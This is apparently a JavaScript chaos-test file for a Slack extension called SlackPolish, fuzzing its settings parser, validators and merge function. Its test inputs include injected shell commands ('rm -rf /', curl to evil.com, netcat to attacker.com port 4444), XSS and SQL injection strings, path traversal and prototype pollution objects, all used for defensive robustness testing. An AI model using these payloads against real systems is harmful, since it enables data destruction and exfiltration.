#!/usr/bin/env node

/**
 * Chaos Tests for Configuration Processing Functions
 * Tests system stability with random, malformed, and malicious configuration data
 */

const path = require('path');
const ChaosTestRunner = require('../framework/chaos-test-runner');

// Import the config processor from vector tests
const { ConfigProcessor } = require('../vector/test_config_processing_vectors');

/**
 * Run chaos tests on configuration processing functions
 */
async function runConfigProcessingChaosTests() {
    console.log('🌪️  SlackPolish Configuration Processing Chaos Tests');
    console.log('===================================================\n');

    const runner = new ChaosTestRunner({ 
        iterations: 150,
        seed: process.env.CHAOS_SEED || Date.now()
    });

    // Test 1: Settings Parsing with Random JSON-like Strings
    runner.runChaosTest(
        'Settings Parsing - Random JSON Strings',
        ConfigProcessor.parseSettings,
        () => {
            const jsonAttempts = [
                // Valid-ish JSON with random values
                JSON.stringify({
                    language: runner.generateRandomString({ maxLength: 50 }),
                    style: runner.generateRandomString({ maxLength: 50 }),
                    randomKey: runner.generateRandomPrimitive()
                }),
                
                // Malformed JSON
                '{"incomplete": "json"',
                '{"trailing": "comma",}',
                '{invalid: "json"}',
                '{"nested": {"very": {"deep": {"object": "value"}}}}',
                
                // JSON with special characters
                '{"key": "value with \\"quotes\\" and \\n newlines"}',
                '{"unicode": "\\u0000\\u0001\\u0002"}',
                
                // Extremely large JSON
                JSON.stringify({ data: 'x'.repeat(10000) }),
                
                // Empty variations
                '{}',
                '[]',
                'null',
                'undefined',
                
                // Non-JSON strings
                runner.generateRandomString({ maxLength: 1000 }),
                runner.generateMaliciousInput()
            ];
            
            return jsonAttempts[Math.floor(runner.rng() * jsonAttempts.length)];
        },
        { expectedType: 'object' }
    );

    // Test 2: Language Validation with Random Inputs
    runner.runChaosTest(
        'Language Validation - Random Inputs',
        ConfigProcessor.validateLanguage,
        () => {
            const inputs = [
                // Random strings
                runner.generateRandomString({ maxLength: 100 }),
                
                // Case variations
                'english', 'ENGLISH', 'English', 'eNgLiSh',
                
                // Similar but invalid languages
                'englishh', 'englsh', 'eng', 'en',
                
                // Other languages not in the list
                'japanese', 'korean', 'arabic', 'russian',
                
                // Numbers and special chars
                '123', 'lang-123', 'en_US', 'en-US',
                
                // Very long strings
                'english'.repeat(1000),
                
                // Unicode and emojis
                '🇺🇸', '🇪🇸', '🇫🇷',
                
                // Injection attempts
                "'; DROP TABLE languages; --",
                '<script>alert("xss")</script>',
                
                // Edge cases
                '', ' ', '\n', '\t', null, undefined
            ];
            
            return inputs[Math.floor(runner.rng() * inputs.length)];
        },
        { expectedType: 'object' }
    );

    // Test 3: Style Validation with Malicious Inputs
    runner.runChaosTest(
        'Style Validation - Malicious Inputs',
        ConfigProcessor.validateStyle,
        () => {
            const maliciousStyles = [
                // Code injection attempts
                'professional; system("rm -rf /")',
                'casual && curl evil.com',
                'friendly | nc attacker.com 4444',
                
                // XSS attempts
                '<script>alert("style")</script>',
                'javascript:alert("style")',
                
                // Path traversal
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32',
                
                // Buffer overflow attempts
                'A'.repeat(100000),
                
                // Format string attacks
                '%s%s%s%s%s',
                '%x%x%x%x%x',
                
                // Unicode exploits
                '\u0000PROFESSIONAL',
                'CASUAL\uFEFF',
                
                // SQL injection
                "' OR 1=1 --",
                "'; DROP TABLE styles; --",
                
                // Template injection
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                
                // Null bytes and control chars
                'professional\x00',
                'casual\x01\x02\x03',
                
                // Very long strings
                'professional'.repeat(10000)
            ];
            
            return maliciousStyles[Math.floor(runner.rng() * maliciousStyles.length)];
        },
        { expectedType: 'object' }
    );

    // Test 4: Hotkey Validation with Random Key Combinations
    runner.runChaosTest(
        'Hotkey Validation - Random Key Combinations',
        ConfigProcessor.validateHotkey,
        () => {
            const randomHotkeys = [
                // Valid-looking but invalid combinations
                'Ctrl+A', 'Alt+F4', 'Shift+Tab', 'Meta+Space',
                
                // Invalid formats
                'ctrl+shift', 'CTRL+SHIFT', 'Ctrl + Shift',
                'Ctrl-Shift', 'Ctrl_Shift', 'Ctrl|Shift',
                
                // Multiple modifiers
                'Ctrl+Alt+Shift', 'Ctrl+Alt+Tab+Space',
                
                // Single keys
                'Ctrl', 'Shift', 'Alt', 'Tab', 'Space',
                
                // Numbers and symbols
                'Ctrl+1', 'Ctrl+!', 'Ctrl+@', 'Ctrl+#',
                
                // Function keys
                'Ctrl+F1', 'Ctrl+F12', 'Ctrl+F99',
                
                // Special characters
                'Ctrl+<', 'Ctrl+>', 'Ctrl+"', "Ctrl+'",
                
                // Unicode
                'Ctrl+🔥', 'Ctrl+α', 'Ctrl+中',
                
                // Very long strings
                'Ctrl+' + 'A'.repeat(1000),
                
                // Empty and whitespace
                '', ' ', '\t', '\n',
                
                // Injection attempts
                'Ctrl+Shift; rm -rf /',
                'Ctrl+<script>alert(1)</script>'
            ];
            
            return randomHotkeys[Math.floor(runner.rng() * randomHotkeys.length)];
        },
        { expectedType: 'object' }
    );

    // Test 5: Settings Merging with Chaotic Objects
    runner.runChaosTest(
        'Settings Merging - Chaotic Objects',
        ConfigProcessor.mergeSettings,
        () => {
            return runner.generateRandomObject(0, 4); // Deep nested objects
        },
        { expectedType: 'object' }
    );

    // Test 6: Settings Merging with Prototype Pollution Attempts
    runner.runChaosTest(
        'Settings Merging - Prototype Pollution',
        ConfigProcessor.mergeSettings,
        () => {
            const pollutionAttempts = [
                // Classic prototype pollution
                { "__proto__": { "isAdmin": true } },
                { "constructor": { "prototype": { "isAdmin": true } } },
                
                // Nested pollution
                { "settings": { "__proto__": { "polluted": true } } },
                
                // Array pollution
                { "__proto__": ["polluted"] },
                
                // Function pollution
                { "__proto__": { "toString": "polluted" } },
                
                // Deep pollution
                { "a": { "b": { "c": { "__proto__": { "polluted": true } } } } },
                
                // Mixed with valid settings
                { 
                    "language": "ENGLISH",
                    "__proto__": { "isAdmin": true },
                    "style": "PROFESSIONAL"
                }
            ];
            
            return pollutionAttempts[Math.floor(runner.rng() * pollutionAttempts.length)];
        },
        { expectedType: 'object' }
    );

    // Test 7: Prompt Config Building with Extreme Settings
    runner.runChaosTest(
        'Prompt Config Building - Extreme Settings',
        ConfigProcessor.buildPromptConfig,
        () => {
            return {
                language: runner.generateRandomString({ maxLength: 1000 }),
                style: runner.generateRandomString({ maxLength: 1000 }),
                personalPolish: runner.generateRandomString({ maxLength: 10000 }),
                smartContext: {
                    enabled: runner.generateRandomPrimitive(),
                    privacyMode: runner.generateRandomPrimitive(),
                    randomProperty: runner.generateRandomObject(0, 3)
                },
                randomProperty: runner.generateRandomPrimitive()
            };
        },
        { expectedType: 'object' }
    );

    // Test 8: All Functions with Completely Random Data Types
    const allFunctions = [
        { name: 'parseSettings', func: ConfigProcessor.parseSettings },
        { name: 'validateLanguage', func: ConfigProcessor.validateLanguage },
        { name: 'validateStyle', func: ConfigProcessor.validateStyle },
        { name: 'validateHotkey', func: ConfigProcessor.validateHotkey },
        { name: 'mergeSettings', func: ConfigProcessor.mergeSettings },
        { name: 'buildPromptConfig', func: ConfigProcessor.buildPromptConfig }
    ];

    allFunctions.forEach(({ name, func }) => {
        runner.runChaosTest(
            `${name} - Random Data Types`,
            func,
            () => {
                const dataTypes = [
                    null,
                    undefined,
                    true,
                    false,
                    0,
                    -1,
                    Infinity,
                    NaN,
                    [],
                    {},
                    function() {},
                    Symbol('test'),
                    new Date(),
                    /regex/,
                    new Error('test'),
                    Buffer.from('test')
                ];
                return dataTypes[Math.floor(runner.rng() * dataTypes.length)];
            },
            { expectedType: 'object' }
        );
    });

    // Print comprehensive summary
    runner.printSummary();
    
    // Exit with appropriate code
    process.exit(runner.getExitCode());
}

// Run tests if this file is executed directly
if (require.main === module) {
    runConfigProcessingChaosTests().catch(error => {
        console.error('❌ Chaos test runner error:', error);
        process.exit(1);
    });
}

module.exports = { runConfigProcessingChaosTests };
